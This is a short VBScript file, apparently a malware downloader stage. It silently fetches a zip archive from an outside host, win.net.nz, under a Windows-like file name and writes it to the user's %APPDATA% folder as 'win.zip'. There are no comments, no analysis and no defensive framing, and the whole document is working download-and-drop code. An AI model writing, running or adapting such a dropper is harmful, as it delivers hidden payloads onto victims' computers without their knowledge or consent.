Set oShell = CreateObject("Wscript.Shell")
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://win.net.nz/content/windows0-1a.zip", False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile oShell.ExpandEnvironmentStrings("%APPDATA%") + "\win.zip", 2
end with